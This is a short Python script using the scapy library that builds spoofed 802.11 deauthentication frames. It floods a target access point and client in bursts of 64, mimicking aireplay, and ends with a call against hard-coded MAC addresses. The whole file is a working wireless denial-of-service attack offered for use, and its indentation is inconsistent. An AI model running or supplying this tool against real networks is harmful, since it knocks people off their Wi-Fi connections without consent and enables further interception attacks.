#!/usr/bin/env python

from scapy.all import *
def perform_deauth(bssid, client, count):
  	pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
		cli_to_ap_pckt = None
		if client != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
		print 'Sending Deauth to ' + client + ' from ' + bssid
		if not count: print 'Press CTRL+C to quit'
		# We will do like aireplay does and send the packets in bursts of 64, then sleep for half a sec or so
		while count != 0:
			try:
				for i in range(64):
					# Send out deauth from the AP
					send(pckt)
					# If we're targeting a client, we will also spoof deauth from the client to the AP
					if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
				# If count was -1, this will be an infinite loop
				count -= 1
			except KeyboardInterrupt:
				break

perform_deauth("04:FE:7F:92:00:51", "64:80:99:8E:AF:4E",10)